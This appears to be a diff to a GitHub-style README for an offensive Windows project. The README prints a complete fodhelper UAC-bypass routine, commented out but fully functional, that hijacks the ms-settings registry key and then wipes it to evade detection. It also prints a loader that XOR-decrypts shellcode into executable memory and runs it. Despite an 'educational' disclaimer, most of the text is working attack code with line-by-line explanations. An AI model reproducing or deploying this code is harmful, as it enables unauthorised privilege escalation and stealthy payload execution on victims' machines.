@@ -1,9 +1,9 @@
-# L3582-490DER Project
+# L3582-490DER
 
 ## Overview
 This project contains two main components: a C++ UAC bypass demonstration and a Python shellcode encryption utility. **This is for educational purposes only** and was developed by ABOLHB to explore Windows API concepts and security mechanisms.
 
-## ⚠️ DISCLAIMER
+## DISCLAIMER
 **I, 3582-490, created this code solely for educational and research purposes. I do not endorse, encourage, or take responsibility for any misuse of this code. Unauthorized use of these techniques against systems you don't own is illegal and unethical. Use this knowledge responsibly and only in environments where you have explicit permission.**
 
 ## Project Structure
@@ -11,40 +11,59 @@ This project contains two main components: a C++ UAC bypass demonstration and a 
 ### 1. L3582-490DER.cpp
 This C++ code demonstrates various Windows API concepts including potential UAC bypass techniques (commented out for safety).
 
-#### Code Explanation:
+#### UAC Bypass Code Explanation:
 ```cpp
 // UAC bypass technique using fodhelper (commented out for safety)
 /*
 void mason__xa() {
     // Creates registry entries to hijack the fodhelper.exe UAC bypass
-    HKEY mason__xb;
-    wchar_t mason__xc[MAX_PATH];
+    HKEY mason__xb; // Registry key handle
+    wchar_t mason__xc[MAX_PATH]; // Buffer for current executable path
+    
+    // Get the path of the current executable
     GetModuleFileNameW(NULL, mason__xc, MAX_PATH);
+    
+    // Create or open registry key for fodhelper hijack
     RegCreateKeyExW(HKEY_CURRENT_USER,
         L"Software\\Classes\\ms-settings\\shell\\open\\command",
         0, NULL, 0, KEY_WRITE, NULL, &mason__xb, NULL);
+    
+    // Set the default value to point to our executable
     RegSetValueExW(mason__xb, L"", 0, REG_SZ, (BYTE*)mason__xc, (wcslen(mason__xc) + 1) * sizeof(wchar_t));
+    
+    // Clear the DelegateExecute value to ensure our command runs
     RegSetValueExW(mason__xb, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
+    
+    // Launch fodhelper.exe which will execute our code with elevated privileges
     ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
+    
+    // Wait for execution to complete
     Sleep(3000);
+    
+    // Clean up registry entries to avoid detection
     RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
 }
 
 // Function to check if the current process has admin privileges
 bool mason__xg() {
-    BOOL mason__xh = FALSE;
-    SID_IDENTIFIER_AUTHORITY mason__xi = SECURITY_NT_AUTHORITY;
-    PSID mason__xj;
+    BOOL mason__xh = FALSE; // Admin check result
+    SID_IDENTIFIER_AUTHORITY mason__xi = SECURITY_NT_AUTHORITY; // NT authority
+    PSID mason__xj; // Group SID
 
+    // Create a SID for the Administrators group
     if (AllocateAndInitializeSid(&mason__xi, 2, SECURITY_BUILTIN_DOMAIN_RID,
         DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &mason__xj)) {
+        // Check if current token is member of Admin group
         CheckTokenMembership(NULL, mason__xj, &mason__xh);
-        FreeSid(mason__xj);
+        FreeSid(mason__xj); // Free the SID
     }
-    return mason__xh; 
+    return mason__xh; // Return admin status
 }
 */
+```
 
+#### Shellcode Execution Code Explanation:
+```cpp
 // Main function demonstrating XOR decryption and execution
 int WINAPI WinMain(HINSTANCE mason__xk, HINSTANCE mason__xl, LPSTR mason__xm, int mason__xn) {
     // The commented section would check for admin privileges and attempt UAC bypass if not admin
@@ -53,18 +72,25 @@ int WINAPI WinMain(HINSTANCE mason__xk, HINSTANCE mason__xl, LPSTR mason__xm, in
     //    return 0;
     // }
     
-    std::string mason__xd;
-    unsigned char mason__xe[] = { 0x42, 0x6A, 0x75, 0xAA, 0xAA, 0x6A, 0x75, 0xAA }; // Encrypted shellcode with XOR
-    unsigned char mason__xf = 0xAA; // XOR key
+    std::string mason__xd; // Unused string variable
     
-    // Decrypt the shellcode using XOR
+    // Encrypted shellcode using XOR cipher (example values)
+    unsigned char mason__xe[] = { 0x42, 0x6A, 0x75, 0xAA, 0xAA, 0x6A, 0x75, 0xAA };
+    
+    unsigned char mason__xf = 0xAA; // XOR decryption key
+    
+    // Decrypt the shellcode using XOR operation
     for (int mason__xi = 0; mason__xi < sizeof(mason__xe); ++mason__xi) {
-        mason__xe[mason__xi] ^= mason__xf;
+        mason__xe[mason__xi] ^= mason__xf; // XOR each byte with key
     }
     
-    // Allocate executable memory and execute the decrypted shellcode
+    // Allocate executable memory for the shellcode
     void* mason__xj = VirtualAlloc(0, sizeof(mason__xe), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    
+    // Copy decrypted shellcode to executable memory
     memcpy(mason__xj, mason__xe, sizeof(mason__xe));
+    
+    // Execute the shellcode by casting memory to function pointer and calling it
     ((void(*)())mason__xj)();
     
     return 0;
